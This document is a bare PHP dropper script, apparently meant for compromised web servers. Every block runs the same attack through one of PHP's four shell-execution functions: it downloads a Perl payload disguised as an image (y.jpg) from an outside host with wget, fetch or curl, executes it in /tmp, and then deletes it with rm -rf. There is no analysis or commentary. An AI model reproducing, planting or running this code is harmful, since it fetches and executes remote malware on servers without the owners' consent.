<?php

echo exec('cd /tmp;wget http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo exec('cd /tmp;fetch http://dida.freezoka.net/y;perl y')."<br>";

echo exec('cd /tmp;curl -O http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo exec('cd /tmp;rm -rf y.jpg ; echo ipays - exploit')."<br>";

echo passthru('cd /tmp;wget http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo passthru('cd /tmp;fetch http://dida.freezoka.net//y.jpg;perl y.jpg')."<br>";

echo passthru('cd /tmp;curl -O http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo passthru('cd /tmp;rm -rf y.jpg ; echo ipays - exploit')."<br>";

echo system('cd /tmp;wget http://dida.freezoka.net//y.jpg;perl y.jpg')."<br>";

echo system('cd /tmp;fetch http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo system('cd /tmp;curl -O http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo system('cd /tmp;rm -rf y.jpg ; echo ipays - exploit')."<br>";

echo shell_exec('cd /tmp;wget http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo shell_exec('cd /tmp;fetch http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo shell_exec('cd /tmp;curl -O http://dida.freezoka.net/y.jpg;perl y.jpg')."<br>";

echo shell_exec('cd /tmp;rm -rf y.jpg ; echo ipays - exploit')."<br>";

?>

